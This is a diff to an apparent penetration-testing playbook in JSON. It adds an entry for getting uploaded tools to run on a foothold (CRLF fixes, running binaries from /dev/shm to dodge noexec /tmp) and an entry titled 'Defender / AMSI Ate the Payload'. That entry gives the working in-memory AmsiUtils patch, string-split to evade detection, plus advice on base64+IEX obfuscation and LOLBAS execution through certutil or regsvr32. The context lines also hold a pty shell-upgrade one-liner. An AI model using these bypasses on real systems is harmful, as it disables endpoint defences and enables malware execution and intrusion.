@@ -115,7 +115,8 @@
         "stty"
       ],
       "requires_any": [
-        "access.shell"
+        "access.shell",
+        "blocker.no_tty"
       ],
       "produces": [],
       "priority": 58,
@@ -129,6 +130,84 @@
         {
           "tool": "python3",
           "run": "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'  # then Ctrl-Z; stty raw -echo; fg; export TERM=xterm"
+        }
+      ]
+    },
+    {
+      "id": "fix-tool-wont-run",
+      "title": "Your Uploaded Tool Won't Run — Fix It",
+      "tool": "sh",
+      "tools": [
+        "sh",
+        "dos2unix"
+      ],
+      "os": [
+        "linux"
+      ],
+      "requires_all": [
+        "blocker.crlf"
+      ],
+      "produces": [
+        "advice.exec"
+      ],
+      "priority": 60,
+      "hypothesis": "\"bad interpreter: No such file or directory\" on a script you uploaded means Windows CRLF line endings — the kernel looks for an interpreter literally named `/bin/bash\\r`. Strip the carriage returns and it runs. The same family of wall: a binary in a noexec /tmp, or one you forgot to chmod +x.",
+      "proves": "nothing attack-wise; it gets your own tooling running on the foothold",
+      "does_not_prove": "anything about the target beyond its mount options",
+      "report": {
+        "finding": "Uploaded tool blocked by line endings / exec perms",
+        "severity": "info"
+      },
+      "commands": [
+        {
+          "tool": "dos2unix",
+          "run": "dos2unix {{script}}  # or: sed -i 's/\\r$//' {{script}}",
+          "note": "CRLF fix: strips the carriage returns so the shebang resolves. The #1 cause of \"bad interpreter\"."
+        },
+        {
+          "tool": "sh",
+          "run": "chmod +x {{binary}}; mv {{binary}} /dev/shm/ && /dev/shm/{{binary}}",
+          "note": "NOEXEC /tmp: if a binary gives \"Permission denied\" even after chmod +x, /tmp is mounted noexec — run it from /dev/shm or your home. Last resort: invoke the loader directly: /lib64/ld-linux-x86-64.so.2 ./{{binary}}."
+        }
+      ]
+    },
+    {
+      "id": "bypass-amsi",
+      "title": "Defender / AMSI Ate the Payload",
+      "tool": "powershell",
+      "tools": [
+        "powershell"
+      ],
+      "os": [
+        "windows"
+      ],
+      "requires_all": [
+        "blocker.amsi"
+      ],
+      "produces": [
+        "advice.amsi"
+      ],
+      "priority": 60,
+      "hypothesis": "\"This script contains malicious content\" or \"contains a virus\" is AMSI/Defender flagging a known payload, not a broken technique. Patch AMSI in your current session, obfuscate the script, or switch to a living-off-the-land path that is not signatured. The payload is fine; its signature is the problem.",
+      "proves": "nothing attack-wise; it gets a blocked payload past the on-host scanner",
+      "does_not_prove": "that EDR is fully blind; behavioural detection may still fire",
+      "report": {
+        "finding": "AMSI / Defender blocked a payload",
+        "severity": "info"
+      },
+      "refs": [
+        "https://amsi.fail/"
+      ],
+      "commands": [
+        {
+          "tool": "powershell",
+          "run": "[Ref].Assembly.GetType('System.Management.Automation.Amsi'+'Utils').GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)",
+          "note": "The classic in-memory AMSI patch for the CURRENT PowerShell session (string-split to dodge the signature on the patch itself). Run it, then your blocked script loads."
+        },
+        {
+          "tool": "powershell",
+          "run": "Invoke-Obfuscation / change the payload",
+          "note": "If the patch is itself caught: obfuscate (variable renames, base64+IEX), use a fresh/rewritten tool, or drop to a LOLBAS technique (certutil, regsvr32) that is not signatured."
         }
       ]
     },
